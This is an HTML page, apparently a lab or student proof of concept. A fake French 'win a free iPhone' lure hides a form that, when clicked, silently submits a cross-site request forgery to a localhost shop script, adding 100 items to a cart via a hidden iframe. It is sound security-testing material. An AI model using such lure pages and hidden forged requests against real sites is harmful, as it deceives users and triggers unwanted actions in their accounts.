<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Gagnez un iPhone 15 GRATUIT!</title>
    <style>
        body {
            font-family: Arial, sans-serif ;
            color: black;
            text-align: center;
            padding: 50px;
        }
        
        
        h1 {
            color: #141416;
            font-size: 36px;
            margin-bottom: 20px;
        }
        
        .prize {
            font-size: 48px;
            margin: 30px 0;
        }
        
        .btn-claim {
            background:  #f093fb ;
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 24px;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            margin: 20px 0;
            box-shadow: 0 10px 30px rgba(245, 87, 108, 0.4);
            transition: all 0.3s ease;
        }
        
        .btn-claim:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(245, 87, 108, 0.6);
        }
        
    </style>
</head>
<body>
    <h1> FÉLICITATIONS! </h1>
    <p style="font-size: 20px;">Vous êtes le <strong>1000ème visiteur</strong>!</p>
    
    <div class="prize"> iPhone 15 Pro Max</div>
    
    <p style="font-size: 18px;">Cliquez sur le bouton ci-dessous pour réclamer votre prix!</p>
    
    <button class="btn-claim" onclick="attemptAttack()">RÉCLAMER MON IPHONE!</button>
    
    <div id="result" style="margin-top: 30px; font-size: 18px; font-weight: bold;"></div>
        


    <!-- formulaire caché pour envoyer requete ajouter au panier -->
    <form id="maliciousForm" action="http://localhost/Carminati/ajouter.php" method="POST" style="display: none;">
        <input type="hidden" name="id_article" value="1">
        <input type="hidden" name="quantite" value="100">
    </form>

    <script>
        function attemptAttack() {
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = ' Tentative d\'attaque en cours...';
            
            const form = document.getElementById('maliciousForm');
            
            const iframe = document.createElement('iframe');
            iframe.name = 'attackFrame';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            form.target = 'attackFrame';
            form.submit();
  
                resultDiv.innerHTML = ' <span style="color: #f3ff17;">ATTAQUE BLOQUÉE!</span><br>'
                
        }
        
    </script>
</body>
</html>
